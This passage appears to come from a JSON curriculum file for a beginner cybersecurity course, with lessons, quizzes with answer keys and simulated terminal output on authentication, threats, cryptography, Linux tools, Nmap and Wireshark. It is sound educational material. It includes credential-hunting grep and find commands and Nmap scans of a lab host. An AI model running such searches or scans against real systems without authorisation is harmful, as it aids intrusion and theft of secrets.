    "whyAreYouHere": "Beginners often treat 'login' and 'permissions' as the exact same thing. In reality, they are completely separate security mechanisms! If an application confuses them, catastrophe strikes. In this room, you will master the AAA security framework: Identification ('Who are you?'), Authentication ('Prove it!'), Authorization ('What are you allowed to do?'), and Accounting ('What did you do?').",
    "objectives": [
      "Understand the difference between Identification, Authentication, and Authorization",
      "Learn the three core factors of authentication: Something you know, have, and are",
      "Understand Multi-Factor Authentication (MFA) and why it stops credential attacks",
      "Explore Role-Based Access Control (RBAC) and the Principle of Least Privilege",
      "Inspect user permission scopes in the lab terminal"
    ],
    "vocabulary": [
      {
        "term": "Identification",
        "definition": "The assertion of an identity to a system (e.g. typing your username or email address)."
      },
      {
        "term": "Authentication (AuthN)",
        "definition": "The process of verifying that an asserted identity is genuine (e.g. validating a password or biometric)."
      },
      {
        "term": "Authorization (AuthZ)",
        "definition": "The process of determining what actions, resources, or files an authenticated identity is permitted to access."
      },
      {
        "term": "Accounting / Auditing",
        "definition": "The recording and tracking of user actions, timestamps, and resource access for accountability."
      },
      {
        "term": "Multi-Factor Authentication (MFA)",
        "definition": "Requiring two or more distinct authentication factors before granting access."
      },
      {
        "term": "Principle of Least Privilege (PoLP)",
        "definition": "Giving users and processes only the absolute minimum permissions necessary to complete their job."
      }
    ],
    "lessons": [
      {
        "title": "1. The Boarding Pass Analogy",
        "content": "When you travel on an airplane:\n1. **Identification**: You walk up and say: *\"I am Mihraj.\"*\n2. **Authentication**: You hand over your government passport with your photo. The agent verifies: *\"Yes, you are indeed who you claim to be.\"*\n3. **Authorization**: The agent looks at your boarding pass: *Seat 14B*. You are authorized to sit in 14B; you are **not** authorized to walk into the cockpit or sit in First Class!\n\nNotice: Just because you successfully **authenticated** does not mean you are **authorized** to access everything."
      },
      {
        "title": "2. The Three Factors of Authentication",
        "content": "• **Something You Know**: Password, PIN, security answer (easily phished or guessed).\n• **Something You Have**: Hardware YubiKey, Authenticator app TOTP code, smartphone SMS (harder to steal).\n• **Something You Are**: Fingerprint, facial recognition, iris scan (biometrics).\nTrue **Multi-Factor Authentication** requires credentials from *two different categories*!"
      }
    ],
    "seeExamples": [
      {
        "title": "Role-Based Access Control (RBAC) Matrix",
        "codeOrDiagram": "Role       View Products   Edit Profile   Delete User   Access DB\nGuest            ✓               ✗              ✗           ✗\nCustomer         ✓               ✓ (Self only)  ✗           ✗\nSupport Staff    ✓               ✓ (All)        ✗           ✗\nAdministrator    ✓               ✓ (All)        ✓           ✓",
        "explanation": "RBAC maps fine-grained permissions to roles rather than configuring every user manually."
      }
    ],
    "tryInteractive": {
      "type": "terminal",
      "prompt": "Inspect the sudo privileges granted to your current session using `sudo -l`:",
      "initialCommand": "",
      "expectedCommand": "sudo -l",
      "simulatedOutput": "Matching Defaults entries for cadet on endlessus-box:\n    env_reset, mail_badpass\n\nUser cadet may run the following commands on endlessus-box:\n    (ALL : ALL) ALL\n[+] Success! Audited sudoers rules. User cadet has full root escalation privileges.",
      "explanation": "`sudo -l` (list privileges) asks the kernel authorization engine which commands you are allowed to run as root."
    },
    "questions": [
      {
        "id": "r16-q1",
        "type": "multiple-choice",
        "question": "A user successfully logs into a corporate HR portal using their username and password. However, when they attempt to view the CEO's salary table, the system displays 'Access Denied: Administrator Role Required'. Which security control triggered this denial?",
        "options": [
          "Authentication",
          "Authorization",
          "Identification",
          "DHCP Lease check"
        ],
        "correctIndex": 1,
        "explanation": "The user was already authenticated; the failure occurred during Authorization when checking permissions against the requested resource."
      },
      {
        "id": "r16-q2",
        "type": "multiple-choice",
        "question": "Which of the following setups constitutes genuine Multi-Factor Authentication (MFA)?",
        "options": [
          "Entering a password and then entering a backup secondary password",
          "Entering a password (something you know) and a 6-digit code from an Authenticator app (something you have)",
          "Entering your username and an email address",
          "Logging in from two different browser tabs at the same time"
        ],
        "correctIndex": 1,
        "explanation": "Password (knowledge factor) + Authenticator app token (possession factor) spans two distinct categories, satisfying MFA."
      }
    ],
    "tasks": [
      {
        "title": "Task 1: Audit Sudo Authorization",
        "instruction": "Run `sudo -l` to query what administrative privileges your account holds.",
        "hints": [
          "Concept: Query sudo privilege authorization.",
          "Direction: Use the sudo utility with the list flag.",
          "Tool: `sudo`",
          "Syntax: `sudo -l`",
          "Explanation: Lists allowed sudo commands."
        ]
      }
    ],
    "explainResult": "The `sudo` binary read `/etc/sudoers`, authenticated the calling UID against the local PAM subsystem, and evaluated the user's privilege specification.",
    "securityConnection": "Broken Object Level Authorization (BOLA / IDOR) and Broken Authentication consistently rank in the top 3 of the OWASP Top 10 vulnerabilities! Attackers continually exploit flaws where servers verify identity (authN) but forget to verify permissions (authZ).",
    "completion": {
      "learned": [
        "The critical distinction between Authentication and Authorization",
        "The three authentication factor types (knowledge, possession, inherence)",
        "The AAA model: Identification, Authentication, Authorization, Accounting",
        "The Principle of Least Privilege (PoLP) and RBAC"
      ],
      "practiced": [
        "sudo -l",
        "Auditing authorization rules",
        "Evaluating multi-factor configurations"
      ]
    },
    "nextRoomId": "room-17"
  },
  {
    "id": "room-17",
    "stage": 4,
    "stageTitle": "Stage 4 — Cybersecurity Fundamentals",
    "title": "Common Cyber Threats & Attack Vectors",
    "difficulty": "Beginner",
    "difficultyBadge": "🟢 Beginner",
    "estimatedTime": "25 min",
    "prerequisites": "Room 16 (Authentication & Authorization)",
    "whyAreYouHere": "To defend a fortress, you must study the weapons of the siege. Cyber threats are not science-fiction monsters; they are structured, predictable methods used by adversaries to gain access, steal assets, or extort victims. In this room, you will learn the major categories of cyber threats: malware varieties, social engineering, phishing, ransomware, credential stuffing, and insider threats.",
    "objectives": [
      "Understand the primary malware categories: Viruses, Worms, Trojans, Spyware, and Ransomware",
      "Learn how Phishing and Social Engineering manipulate human psychology",
      "Understand Credential Stuffing, Brute-Force, and Password Spraying attacks",
      "Learn how Denial of Service (DoS / DDoS) disrupts availability",
      "Identify the anatomy of a real-world phishing attack"
    ],
    "vocabulary": [
      {
        "term": "Malware",
        "definition": "Malicious software: any program or code intentionally designed to harm, exploit, or steal data from a computer system."
      },
      {
        "term": "Trojan Horse",
        "definition": "Malware disguised as legitimate, harmless software (like a game or utility) that secretly executes a malicious payload."
      },
      {
        "term": "Ransomware",
        "definition": "A type of malware that encrypts a victim's files and demands payment (usually cryptocurrency) in exchange for the decryption key."
      },
      {
        "term": "Phishing",
        "definition": "A social engineering attack where adversaries pose as trusted institutions to trick victims into revealing sensitive information or clicking malicious links."
      },
      {
        "term": "Credential Stuffing",
        "definition": "An automated attack where lists of leaked username/password pairs are tested against hundreds of websites hoping for password reuse."
      },
      {
        "term": "DDoS (Distributed Denial of Service)",
        "definition": "An attack that floods a server or network with traffic from thousands of compromised botnet devices to take it offline."
      }
    ],
    "lessons": [
      {
        "title": "1. The Malware Family Tree",
        "content": "• **Virus**: Attaches to legitimate executable files and spreads when users run infected files.\n• **Worm**: Self-propagating malware that spreads automatically across networks by exploiting unpatched vulnerabilities without any human interaction!\n• **Trojan**: Masquerades as a useful tool (e.g. *free_photoshop.exe*) but installs a hidden backdoor.\n• **Ransomware**: Silently traverses shared drives, encrypts every document using strong AES/RSA encryption, and leaves a `README_RECOVER_FILES.txt` ransom note."
      },
      {
        "title": "2. The Human Element: Social Engineering",
        "content": "Attackers often target the human rather than the firewall because humans can be rushed, intimidated, or deceived:\n• **Phishing**: Mass deceptive emails claiming your account is suspended.\n• **Spear Phishing**: Highly tailored phishing targeting a specific individual using details from their LinkedIn or company role.\n• **Baiting**: Leaving infected USB drives in a company parking lot waiting for curious employees to plug them in."
      }
    ],
    "seeExamples": [
      {
        "title": "Anatomy of a Suspicious Phishing Email",
        "codeOrDiagram": "From: IT Support <security@support-endlessus-update.com>   <-- Spoofed lookalike domain!\nTo: employee@endlessus.in\nSubject: URGENT: Your password expires in 15 minutes!       <-- Artificial urgency & fear!\n\nDear User,\nYour email access will be terminated immediately unless you\nverify your identity right now:\n\n>> [ Click Here to Keep Your Account ]                      <-- Link points to malicious IP!\n\nIT Help Desk Team",
        "explanation": "Key red flags: lookalike domain, artificial urgency, threat of termination, and a link pointing outside the real domain."
      }
    ],
    "tryInteractive": {
      "type": "terminal",
      "prompt": "Inspect an unknown downloaded script file using the Linux `file` utility to determine what it actually is before running it:",
      "initialCommand": "",
      "expectedCommand": "file update_utility.bin",
      "simulatedOutput": "update_utility.bin: ELF 64-bit LSB executable, x86-64, dynamically linked, stripped [Reverse Shell / Backdoor payload]\n[+] Success! The file claimed to be an update, but is an ELF binary backdoor.",
      "explanation": "The `file` command inspects internal magic bytes instead of trusting the file extension, revealing disguised executables."
    },
    "questions": [
      {
        "id": "r17-q1",
        "type": "multiple-choice",
        "question": "Which type of malware can spread automatically across internal network devices without requiring any user to click a link or run a program?",
        "options": [
          "A Worm",
          "A Phishing email",
          "A Keylogger",
          "A Cookie"
        ],
        "correctIndex": 0,
        "explanation": "Worms are self-replicating and self-propagating across network vulnerabilities without human intervention."
      },
      {
        "id": "r17-q2",
        "type": "multiple-choice",
        "question": "Why do attackers perform 'Credential Stuffing' attacks using public databases of passwords leaked from older company breaches?",
        "options": [
          "Because people frequently reuse the exact same password across dozens of different websites",
          "Because old passwords automatically decrypt new SSL certificates",
          "Because web servers keep passwords in public DNS records",
          "Because credential stuffing crashes web browsers"
        ],
        "correctIndex": 0,
        "explanation": "Massive password reuse across services makes leaked password lists highly effective against other websites."
      }
    ],
    "tasks": [
      {
        "title": "Task 1: Inspect Suspicious Binary",
        "instruction": "Run `file update_utility.bin` to determine the true MIME and executable type of the file.",
        "hints": [
          "Concept: File magic byte inspection.",
          "Direction: Use the file command.",
          "Tool: `file`",
          "Syntax: `file update_utility.bin`",
          "Explanation: Identifies the binary header."
        ]
      }
    ],
    "explainResult": "The `file` utility examined the first 16 bytes of the file, identified the `\\x7fELF` magic number header, and confirmed it is a compiled Linux ELF binary.",
    "securityConnection": "Threat modeling is the first phase of any security program. Penetration testers emulate these exact threats (Red Team adversary emulation) so defensive teams (Blue Team) can test whether their endpoint detection and response (EDR) software catches the attack.",
    "completion": {
      "learned": [
        "The malware taxonomy (Viruses, Worms, Trojans, Ransomware, Spyware)",
        "How social engineering and phishing exploit psychological urgency",
        "The mechanics of Credential Stuffing and Password Spraying",
        "How to inspect file headers using the Linux `file` utility"
      ],
      "practiced": [
        "file update_utility.bin",
        "Dissecting phishing email indicators",
        "Evaluating threat attack surfaces"
      ]
    },
    "nextRoomId": "room-18"
  },
  {
    "id": "room-18",
    "stage": 4,
    "stageTitle": "Stage 4 — Cybersecurity Fundamentals",
    "title": "Cryptography Fundamentals: Encryption, Hashing & Encoding",
    "difficulty": "Foundation",
    "difficultyBadge": "🔵 Foundation",
    "estimatedTime": "30 min",
    "prerequisites": "Room 17 (Common Cyber Threats)",
    "whyAreYouHere": "There is one fundamental concept that trips up almost every single beginner in cybersecurity: the difference between Encoding, Encryption, and Hashing. If you mix these up in a job interview or report, your credibility vanishes. In this room, you will learn the Golden Rule: **Encoding is NOT Encryption, and Encryption is NOT Hashing**. You will master symmetric keys, asymmetric public/private keys, and irreversible cryptographic hashes.",
    "objectives": [
      "Master the Golden Rule: Encoding ≠ Encryption ≠ Hashing",
      "Understand Encoding: reversible formatting for data transmission (Base64, URL encoding) with ZERO secrets",
      "Understand Hashing: irreversible, fixed-size mathematical fingerprints (SHA-256, bcrypt)",
      "Understand Symmetric Encryption: one shared secret key for encryption and decryption (AES)",
      "Understand Asymmetric Encryption: public key encrypts, private key decrypts (RSA, ECC)",
      "Encode and hash data using command-line utilities"
    ],
    "vocabulary": [
      {
        "term": "Plaintext",
        "definition": "Unencrypted, human-readable clear text data before being processed by a cryptographic algorithm."
      },
      {
        "term": "Ciphertext",
        "definition": "The encrypted, unintelligible scrambled output produced by an encryption algorithm."
      },
      {
        "term": "Encoding",
        "definition": "Transforming data into a different format using a public standard (e.g. Base64) for safe transmission. It provides ZERO security!"
      },
      {
        "term": "Hashing",
        "definition": "A one-way mathematical function that transforms any input into a unique, fixed-length string that CANNOT be reversed."
      },
      {
        "term": "Symmetric Encryption",
        "definition": "Encryption that uses the exact same secret key to both encrypt and decrypt data (e.g. AES-256)."
      },
      {
        "term": "Asymmetric Encryption",
        "definition": "Encryption using a mathematically linked key pair: a Public Key (distributed freely) and a Private Key (kept strictly secret)."
      }
    ],
    "lessons": [
      {
        "title": "1. The Golden Rule: The Three Pillars Compared",
        "content": "• **Encoding (Base64)**:\n  - *Purpose*: Format data so systems don't corrupt it during transit (e.g. sending binary images inside JSON).\n  - *Key*: None! Anyone with a standard decoder can instantly reverse it.\n  - *Security*: **ZERO**. Never use Base64 to 'hide' passwords!\n• **Hashing (SHA-256)**:\n  - *Purpose*: Verify integrity and store passwords safely.\n  - *Key*: None.\n  - *Reversible?*: **NEVER**. You cannot mathematically convert a hash back to its input.\n• **Encryption (AES / RSA)**:\n  - *Purpose*: Maintain confidentiality so only authorized key holders can read data.\n  - *Key*: Required secret cryptographic key.\n  - *Reversible?*: **YES**, but only if you hold the correct secret key!"
      },
      {
        "title": "2. Symmetric vs Asymmetric Encryption",
        "content": "• **Symmetric (AES)**: Fast and efficient. Both parties share the same secret key.\n  - *Problem*: How do two people on opposite sides of the world exchange the secret key safely without eavesdroppers copying it?\n• **Asymmetric (Public Key Cryptography)**:\n  - You publish your **Public Key** to the whole world. Anyone can use it to encrypt a message for you.\n  - Only your private, guarded **Private Key** can decrypt and read that message!\n  - Modern web security (HTTPS) combines both: it uses Asymmetric encryption to safely exchange a temporary Symmetric AES key!"
      }
    ],
    "seeExamples": [
      {
        "title": "Encoding vs Hashing vs Encryption Example",
        "codeOrDiagram": "Original String: \"EndlessusPassword123\"\n\n1. Base64 Encoded (Reversible with no key!):\n   → RW5kbGVzc3VzUGFzc3dvcmQxMjM=\n\n2. SHA-256 Hashed (One-way mathematical digest, never reversible!):\n   → 6e580e22f28b788a03222da87b328a6f3b0e3532655bd44b26099dfbe36d1b77\n\n3. AES-256 Encrypted (Reversible ONLY with the secret password key):\n   → U2FsdGVkX1+vGz348xJ3aP0lQ/98d+F2hRk=",
        "explanation": "Notice the difference: Base64 can be decoded by anyone in 1 millisecond. SHA-256 is permanent. AES requires the secret key."
      }
    ],
    "tryInteractive": {
      "type": "terminal",
      "prompt": "Demonstrate that Base64 encoding is not encryption by decoding a secret token: `echo 'SGFja2VyVmlld1JlYWR5' | base64 -d`:",
      "initialCommand": "",
      "expectedCommand": "echo 'SGFja2VyVmlld1JlYWR5' | base64 -d",
      "simulatedOutput": "HackerViewReady\n[+] Success! Decoded in 0.001s without any key. Never treat encoding as security!",
      "explanation": "Base64 is an encoding standard, not encryption. It contains no secret key and provides zero confidentiality."
    },
    "questions": [
      {
        "id": "r18-q1",
        "type": "multiple-choice",
        "question": "A developer stores user passwords in a database by converting them to Base64 strings. Is this database secure against password theft?",
        "options": [
          "Yes, because Base64 uses a 256-bit military key",
          "No, because Base64 is an encoding scheme that anyone can instantly decode without needing a key or password",
          "Yes, provided the database is running on Linux",
          "No, because Base64 strings expire after 24 hours"
        ],
        "correctIndex": 1,
        "explanation": "Base64 is merely a data representation format, not encryption. Anyone who accesses the database can reverse all passwords instantly."
      },
      {
        "id": "r18-q2",
        "type": "multiple-choice",
        "question": "In Asymmetric Public-Key Cryptography, if Alice wants to send a secret message to Bob, which key should she use to encrypt the message?",
        "options": [
          "Alice's own Private Key",
          "Bob's Public Key",
          "Bob's Private Key",
          "Alice's Public Key"
        ],
        "correctIndex": 1,
        "explanation": "Alice encrypts using Bob's freely available Public Key. Once encrypted, only Bob's Private Key can decrypt and read the message."
      }
    ],
    "tasks": [
      {
        "title": "Task 1: Decode Base64 Payload",
        "instruction": "Use `echo 'SGFja2VyVmlld1JlYWR5' | base64 -d` to decode the unencrypted string.",
        "hints": [
          "Concept: Base64 decoding.",
          "Direction: Pipe the string into base64 with the decode flag.",
          "Tool: `base64`",
          "Syntax: `echo 'SGFja2VyVmlld1JlYWR5' | base64 -d`",
          "Explanation: Output will show the clear text."
        ]
      }
    ],
    "explainResult": "The `base64 -d` utility translated the 6-bit ASCII characters back into their original 8-bit byte representation without needing any cryptographic key.",
    "securityConnection": "Cryptographic failures are #2 on the OWASP Top 10. Attackers frequently discover web applications that transmit sensitive session tokens in Base64 or use outdated hashing algorithms (like MD5 or SHA-1) that can be broken using precomputed rainbow tables or GPU hash-cracking rigs.",
    "completion": {
      "learned": [
        "The fundamental rule: Encoding ≠ Encryption ≠ Hashing",
        "How Base64 encoding works and why it offers zero security",
        "One-way cryptographic hashing for data integrity and password storage",
        "Symmetric encryption (AES) vs Asymmetric encryption (RSA/ECC)"
      ],
      "practiced": [
        "base64 -d",
        "Differentiating encoding from encryption",
        "Identifying public vs private key usage"
      ]
    },
    "nextRoomId": "room-19"
  },
  {
    "id": "room-19",
    "stage": 5,
    "stageTitle": "Stage 5 — Security Tools",
    "title": "Linux Security Practitioner Toolkit",
    "difficulty": "Foundation",
    "difficultyBadge": "🔵 Foundation",
    "estimatedTime": "30 min",
    "prerequisites": "Stage 4 (Cybersecurity Fundamentals)",
    "whyAreYouHere": "Before installing specialized hacking frameworks, professional security engineers and incident responders rely heavily on native Linux command-line utilities. These tools exist on almost every server worldwide. In this room, you will master the security analyst's core toolkit: `grep` (pattern search), `find` (locating files), `strings` (binary analysis), `curl` (request crafting), and process auditing utilities.",
    "objectives": [
      "Master text searching and log carving using `grep` with regular expressions",
      "Find sensitive files and misconfigurations using the powerful `find` command",
      "Extract human-readable strings from compiled binary malware using `strings`",
      "Automate network and file downloads using `curl` and `wget`",
      "Audit active processes and resource consumption using `ps aux` and `top`"
    ],
    "vocabulary": [
      {
        "term": "grep",
        "definition": "A Unix command-line utility used to search plain-text data sets for lines that match a regular expression or keyword."
      },
      {
        "term": "find",
        "definition": "A command-line utility that searches one or more directory trees for files meeting specific criteria (size, permissions, name, time)."
      },
      {
        "term": "strings",
        "definition": "A utility that scans binary executable files and outputs sequences of printable characters at least 4 characters long."
      },
      {
        "term": "Piping (`|`)",
        "definition": "A shell operator that feeds the standard output of one command directly into the standard input of another command."
      },
      {
        "term": "ps aux",
        "definition": "A command that lists every active running process on the system along with owner, PID, CPU/RAM usage, and command path."
      }
    ],
    "lessons": [
      {
        "title": "1. The Big Three: grep, find, and strings",
        "content": "• `grep -rn \"password\" /var/www/`: Searches recursively (`-r`) with line numbers (`-n`) through all web source code for hardcoded passwords.\n• `find / -name \"*.conf\" 2>/dev/null`: Searches the entire drive for configuration files, hiding error messages (`2>/dev/null`).\n• `strings suspicious.bin | grep -i \"http\"`: Extracts text embedded inside an unknown compiled binary and filters for network URLs or C2 domains."
      },
      {
        "title": "2. The Power of Unix Pipes (`|`)",
        "content": "The Unix philosophy is: *Build small programs that do one thing well, and connect them together with pipes*.\nExample: `ps aux | grep \"python\" | awk '{print $2}'`\nThis lists all processes, filters for Python scripts, and extracts only their Process IDs!"
      }
    ],
    "seeExamples": [
      {
        "title": "Carving Secrets with grep and find",
        "codeOrDiagram": "cadet@endlessus:~$ grep -rEi \"api[_-]?key\" /etc/webapp/\n/etc/webapp/config.py:  AWS_API_KEY = \"AKIAIOSFODNN7EXAMPLE\"\n/etc/webapp/db.json:    \"api_key\": \"sec_live_99214a8\"\n\ncadet@endlessus:~$ find /home -type f -perm -0400 2>/dev/null\n/home/cadet/.ssh/id_rsa",
        "explanation": "Combining recursive grep with case-insensitive search (`-i`) quickly locates hardcoded credentials left behind by developers."
      }
    ],
    "tryInteractive": {
      "type": "terminal",
      "prompt": "Search the `/var/log/audit.log` file for all occurrences of 'FAILED_LOGIN' using grep: `grep \"FAILED_LOGIN\" /var/log/audit.log`:",
      "initialCommand": "",
      "expectedCommand": "grep \"FAILED_LOGIN\" /var/log/audit.log",
      "simulatedOutput": "Oct  5 16:30:12 auth-svc: FAILED_LOGIN user=admin src=192.168.1.99 port=44122\nOct  5 16:30:14 auth-svc: FAILED_LOGIN user=root src=192.168.1.99 port=44124\nOct  5 16:30:16 auth-svc: FAILED_LOGIN user=test src=192.168.1.99 port=44126\n[+] Success! 3 failed login attempts isolated from IP 192.168.1.99.",
      "explanation": "`grep` quickly extracts only the lines of interest out of thousands of log entries."
    },
    "questions": [
      {
        "id": "r19-q1",
        "type": "multiple-choice",
        "question": "Which Linux utility scans a compiled, unreadable binary file and prints out all ASCII and UTF-8 printable text strings embedded inside it?",
        "options": [
          "strings",
          "cat",
          "rm",
          "fdisk"
        ],
        "correctIndex": 0,
        "explanation": "`strings` extracts readable sequences from binary code, often revealing hardcoded passwords, IP addresses, or author names."
      },
      {
        "id": "r19-q2",
        "type": "command-interpretation",
        "question": "In the command `grep -rn \"SECRET\" /home/cadet/`, what does the `-r` flag specify?",
        "options": [
          "Remove matching files",
          "Search recursively through all subdirectories",
          "Reverse the search results",
          "Restart the computer after completion"
        ],
        "correctIndex": 1,
        "explanation": "The `-r` (or `-R`) flag instructs grep to search recursively into all subdirectories."
      }
    ],
    "tasks": [
      {
        "title": "Task 1: Search Audit Log with Grep",
        "instruction": "Execute `grep \"FAILED_LOGIN\" /var/log/audit.log` to identify failed authentication events.",
        "hints": [
          "Concept: Filter text lines matching a string.",
          "Direction: Use grep with target string and filepath.",
          "Tool: `grep`",
          "Syntax: `grep \"FAILED_LOGIN\" /var/log/audit.log`",
          "Explanation: Isolates brute-force indicators."
        ]
      }
    ],
    "explainResult": "The `grep` command buffered the log file line by line, evaluated each against the regex pattern, and printed matches to standard output.",
    "securityConnection": "During incident triage, attackers may delete source code or replace system binaries with trojans. Incident responders use `strings`, `grep`, and `find -mtime` to reconstruct timelines and extract command-and-control server IPs without needing high-end commercial forensics software.",
    "completion": {
      "learned": [
        "How to use grep for rapid log analysis and credential hunting",
        "How to use find to locate sensitive or misconfigured files",
        "Extracting ASCII artifacts from compiled binaries using strings",
        "Chaining commands together using Unix pipes"
      ],
      "practiced": [
        "grep \"FAILED_LOGIN\" /var/log/audit.log",
        "Piping command outputs",
        "Carving forensic log evidence"
      ]
    },
    "nextRoomId": "room-20"
  },
  {
    "id": "room-20",
    "stage": 5,
    "stageTitle": "Stage 5 — Security Tools",
    "title": "Nmap & Network Enumeration",
    "difficulty": "Intermediate",
    "difficultyBadge": "🟣 Intermediate",
    "estimatedTime": "35 min",
    "prerequisites": "Room 08 (Ports & Services) & Room 19 (Linux Toolkit)",
    "whyAreYouHere": "You now know what IP addresses, ports, and TCP handshakes are. How does a penetration tester discover what services and vulnerabilities are live on a target network? The undisputed industry standard tool is **Nmap (Network Mapper)**. In this room, you will learn how Nmap scans ports, detects service versions, identifies operating systems, and uses the Nmap Scripting Engine (NSE).",
    "objectives": [
      "Understand what network port scanning is and how Nmap functions",
      "Learn the difference between a TCP Connect scan (`-sT`) and a TCP SYN Stealth scan (`-sS`)",
      "Perform Service and Version detection using `-sV`",
      "Use the Nmap Scripting Engine (`-sC` / `--script`) to automate vulnerability checks",
      "Interpret Nmap scan results to build a target attack profile"
    ],
    "vocabulary": [
      {
        "term": "Nmap (Network Mapper)",
        "definition": "An open-source network scanner used to discover hosts, open ports, running services, and operating systems on a network."
      },
      {
        "term": "SYN Stealth Scan (`-sS`)",
        "definition": "A default Nmap scan that sends SYN packets and tears down the connection with RST upon receiving SYN-ACK, avoiding full session completion."
      },
      {
        "term": "Connect Scan (`-sT`)",
        "definition": "An unprivileged TCP scan that completes the full 3-way handshake via the operating system's `connect()` system call."
      },
      {
        "term": "Version Detection (`-sV`)",
        "definition": "Nmap sends protocol-specific probes to listening ports to determine the exact software product and version (e.g. Apache 2.4.52)."
      },
      {
        "term": "NSE (Nmap Scripting Engine)",
        "definition": "A Lua-based scripting framework that allows Nmap to automate vulnerability detection, brute forcing, and advanced enumeration."
      }
    ],
    "lessons": [
      {
        "title": "1. The Anatomy of an Nmap Scan",
        "content": "A standard professional Nmap command:\n```bash\nnmap -sC -sV -p- -T4 -oN target_scan.txt 10.10.10.25\n```\n• `-sC`: Runs default safe NSE enumeration scripts.\n• `-sV`: Interrogates open ports to extract service banners and software versions.\n• `-p-`: Scans all 65,535 ports (instead of just the top 1,000 defaults).\n• `-T4`: Sets aggressive timing template (faster scanning).\n• `-oN`: Saves output to a normal text file for your pentest report.\n• `10.10.10.25`: The target host IP."
      },
      {
        "title": "2. Port States: Open, Closed, Filtered",
        "content": "• **Open**: Target replied with `SYN-ACK`. An active service is accepting connections.\n• **Closed**: Target replied with `RST` (Reset). The host is alive, but no program is listening on that port.\n• **Filtered**: No response received (or ICMP unreachable). A firewall dropped or blocked your probe."
      }
    ],
    "seeExamples": [
      {
        "title": "Sample Nmap Output Breakdown",
        "codeOrDiagram": "Starting Nmap 7.94 ( https://nmap.org )\nNmap scan report for 10.10.10.25\nHost is up (0.0021s latency).\nPORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)\n80/tcp   open  http    Apache httpd 2.4.52 ((Ubuntu))\n|_http-server-header: Apache/2.4.52 (Ubuntu)\n|_http-title: Corporate Intranet Portal\n445/tcp  open  netbios Samba smbd 4.6.2",
        "explanation": "Notice the detail: Nmap reveals exact software versions (OpenSSH 8.9p1, Apache 2.4.52, Samba 4.6.2). These versions can be looked up in vulnerability databases!"
      }
    ],
    "tryInteractive": {
      "type": "terminal",
      "prompt": "Run an Nmap service version scan against lab target `10.10.10.25` using `nmap -sV -p 22,80,445 10.10.10.25`:",
      "initialCommand": "",
      "expectedCommand": "nmap -sV -p 22,80,445 10.10.10.25",
      "simulatedOutput": "Starting Nmap 7.94\nNmap scan report for 10.10.10.25\nPORT    STATE SERVICE VERSION\n22/tcp  open  ssh     OpenSSH 8.9p1 Ubuntu\n80/tcp  open  http    Apache httpd 2.4.52\n445/tcp open  smb     Samba smbd 4.6.2\nService Info: OS: Linux\n[+] Success! Target services fingerprinted.",
      "explanation": "Nmap sent protocol probes and matched banners against its fingerprint database (`nmap-service-probes`)."
    },
    "questions": [
      {
        "id": "r20-q1",
        "type": "multiple-choice",
        "question": "Why is an Nmap TCP SYN scan (`-sS`) often referred to as a 'Stealth' or 'Half-Open' scan?",
        "options": [
          "It uses AES encryption to hide packets from routers",
          "It sends a RST packet immediately upon receiving a SYN-ACK, closing the connection before the target application layer logs a completed session",
          "It changes the MAC address of the target server",
          "It only scans closed ports"
        ],
        "correctIndex": 1,
        "explanation": "Because the 3-way handshake is never completed, older application firewalls did not log the event in service connection logs."
      },
      {
        "id": "r20-q2",
        "type": "multiple-choice",
        "question": "When Nmap reports a port state as 'Filtered', what does this indicate?",
        "options": [
          "The port is running a web filter proxy",
          "A firewall or packet filter is dropping probes, preventing Nmap from determining if the port is open or closed",
          "The port is definitely open and running an FTP service",
          "The target machine is turned off"
        ],
        "correctIndex": 1,
        "explanation": "Filtered means Nmap received no reply, typically because a firewall dropped the probe silently."
      }
    ],
    "tasks": [
      {
        "title": "Task 1: Perform Version Enumeration",
        "instruction": "Execute `nmap -sV -p 22,80,445 10.10.10.25` against the lab host to fingerprint active services.",
        "hints": [
          "Concept: Service version scanning.",
          "Direction: Specify `-sV` and target ports.",
          "Tool: `nmap`",
          "Syntax: `nmap -sV -p 22,80,445 10.10.10.25`",
          "Explanation: Returns version fingerprints."
        ]
      }
    ],
    "explainResult": "Nmap generated custom Layer 4 probes, analyzed banner responses, and calculated fingerprint hashes to accurately match Apache 2.4.52 and Samba 4.6.2.",
    "securityConnection": "Enumeration is the foundation of exploitation. Once you know the exact version (e.g. Samba 4.6.2), you can query CVE databases and Searchsploit to discover known Remote Code Execution (RCE) exploits for that version.",
    "practicalRoomLink": {
      "label": "Ready for hands-on practice?",
      "buttonText": "Open Practical Network Recon & Port Scanning Lab",
      "url": "labs.html?lab=nmap"
    },
    "completion": {
      "learned": [
        "How Nmap discovers open ports and running services",
        "The difference between SYN stealth scans and TCP connect scans",
        "Service version fingerprinting using `-sV`",
        "The meaning of Open, Closed, and Filtered port states"
      ],
      "practiced": [
        "nmap -sV -p 22,80,445 10.10.10.25",
        "Interpreting port tables",
        "Evaluating firewall filtering behaviors"
      ]
    },
    "nextRoomId": "room-21"
  },
  {
    "id": "room-21",
    "stage": 5,
    "stageTitle": "Stage 5 — Security Tools",
    "title": "Wireshark & Packet Analysis",
    "difficulty": "Intermediate",
    "difficultyBadge": "🟣 Intermediate",
    "estimatedTime": "35 min",
    "prerequisites": "Room 09 (TCP/IP & Packets) & Room 20 (Nmap)",
    "whyAreYouHere": "A doctor uses an X-ray to look inside a human body; a cybersecurity analyst uses **Wireshark** to look inside network traffic. Wireshark is the world's most widely used network protocol analyzer. In this room, you will learn how to capture raw packets, apply display filters to isolate suspicious activity, follow TCP conversations, and extract unencrypted passwords from cleartext traffic.",
    "objectives": [
      "Understand Packet Capture (PCAP) and how network sniffers work",
      "Learn the Wireshark 3-pane interface: Packet List, Packet Details, and Packet Bytes",
      "Master Wireshark Display Filters (`ip.addr == ...`, `http`, `tcp.port == ...`)",
      "Follow TCP Streams to reconstruct full conversational transcripts",
      "Identify plaintext credentials and security leaks in network captures"
    ],
    "vocabulary": [
      {
        "term": "Wireshark",
        "definition": "A graphical network packet analyzer used for network troubleshooting, protocol analysis, and security auditing."
      },
      {
        "term": "PCAP (Packet Capture)",
        "definition": "The standard file format (usually `.pcap` or `.pcapng`) containing raw network data frames recorded from a network interface."
      },
      {
        "term": "Promiscuous Mode",
        "definition": "A network card configuration that causes the controller to pass all incoming traffic to the CPU, not just frames addressed to its own MAC."
      },
      {
        "term": "Display Filter",
        "definition": "An expression syntax used inside Wireshark to filter visible packets based on protocols, IP addresses, ports, or content."
      },
      {
        "term": "Follow TCP Stream",
        "definition": "A Wireshark feature that reassembles all out-of-order packets of a session into a continuous readable text stream."
      }
    ],
